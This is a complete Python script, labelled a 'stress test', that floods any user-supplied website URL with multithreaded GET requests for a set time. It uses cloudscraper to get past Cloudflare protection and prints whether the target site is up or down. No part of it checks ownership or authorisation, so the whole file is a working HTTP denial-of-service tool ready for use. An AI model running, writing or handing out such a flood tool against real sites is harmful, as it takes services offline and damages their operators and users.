import cloudscraper
from concurrent.futures import ThreadPoolExecutor
from time import time, sleep
from threading import Lock

def send_request(url, until_datetime, scraper):
    while (until_datetime - time()) > 0:
        try:
            response = scraper.get(url)
        except Exception as e:
            pass

def check_website_status(url):
    try:
        scraper = cloudscraper.create_scraper()
        response = scraper.head(url)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False

def print_colored(text, color):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "blue": "\033[94m",
        "end": "\033[0m"
    }
    print(f"{colors[color]}{text}{colors['end']}")

if __name__ == "__main__":
    url = input("Enter website URL (including http:// or https://): ")
    num_threads = int(input("Enter number of threads to use: "))
    duration = int(input("Enter duration of stress test in seconds: "))
    until_datetime = time() + duration
    scraper = cloudscraper.create_scraper()
    print_colored(f"Stress test started on {url} successfully!", "blue")
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_threads):
            executor.submit(send_request, url, until_datetime, scraper)
        while (until_datetime - time()) > 0:
            if int(until_datetime - time()) % 10 == 0:
                if check_website_status(url):
                    print_colored("Website up", "green")
                else:
                    print_colored("Website down", "red")
            sleep(1)
    print_colored("Stress test completed", "blue")
